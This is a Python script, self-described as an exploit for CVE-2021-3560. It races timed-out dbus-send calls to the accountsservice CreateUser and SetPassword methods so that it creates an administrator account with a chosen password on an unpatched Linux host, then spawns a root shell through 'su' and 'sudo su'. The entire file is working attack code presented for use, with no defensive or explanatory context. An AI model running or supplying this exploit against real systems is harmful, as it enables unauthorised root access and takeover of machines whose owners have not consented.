import subprocess
import time
import random

# Constants
CREATE_USER_DELAY_START = 0.0001
CREATE_USER_DELAY_INCREMENT = 0.001
CREATE_USER_MAX_ATTEMPTS = 600
SET_PASSWORD_ATTEMPTS = 200
SET_PASSWORD_DELAY_RANGE = (0.006, 0.009)

# Function to check if a user exists
def check_user_exists(username):
    try:
        subprocess.run(['id', username], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

# Function to create a new user
def create_user(username, full_name):
    killtime = CREATE_USER_DELAY_START
    for _ in range(CREATE_USER_MAX_ATTEMPTS):
        try:
            subprocess.run([
                'dbus-send', 
                '--system', 
                '--dest=org.freedesktop.Accounts', 
                '--type=method_call', 
                '--print-reply=literal', 
                '/org/freedesktop/Accounts', 
                'org.freedesktop.Accounts.CreateUser', 
                f'string:{username}', 
                f'string:{full_name}', 
                'int32:1'
            ], timeout=killtime)
        except subprocess.TimeoutExpired:
            pass  # Normal part of this exploit's operation
        if check_user_exists(username):
            print("User created successfully.")
            return
        killtime += CREATE_USER_DELAY_INCREMENT

# Function to set a password for the user
def set_password(username, password=None):
    if password:
        hashed_password = subprocess.run(['openssl', 'passwd', '-5', password], capture_output=True).stdout.decode().strip()
        password_cmd = f"string:{hashed_password}"
    else:
        password_cmd = "string:"
    uid = subprocess.run(['id', '-u', username], capture_output=True).stdout.decode().strip()
    user_dbus_path = f"/org/freedesktop/Accounts/User{uid}"
    
    for _ in range(SET_PASSWORD_ATTEMPTS):
        try:
            subprocess.run([
                'dbus-send',
                '--system',
                '--dest=org.freedesktop.Accounts',
                '--type=method_call',
                '--print-reply',
                user_dbus_path,
                'org.freedesktop.Accounts.User.SetPassword',
                password_cmd,
                'string:AskPassword'
            ], timeout=random.uniform(*SET_PASSWORD_DELAY_RANGE))
        except subprocess.TimeoutExpired:
            continue

# Main function
def main():
    print("#############################")
    print("EXPLOIT FOR CVE-2021-3560 :3")
    print("#############################")
    username = input("\nEnter name of new user: ")
    full_name = input("Enter complete name of new user: ")

    if not check_user_exists(username):
        create_user(username, full_name)
        pass_choice = input(f"Would you like to setup a password for {username}? [y/n]: ").lower()
        if pass_choice == 'y':
            password = input("Enter password: ")
            set_password(username, password)
            
        else:
            set_password(username)
            print(f"[+] Exploit Completed, Your new user is  + {username} +  just log into it like, 'su ' + {username} , or 'su - john' and then 'sudo su' to root ")

    else:
        print("User already exists.")
    p = subprocess.call(f"(su {username} -c 'sudo su')", shell=True)
main()
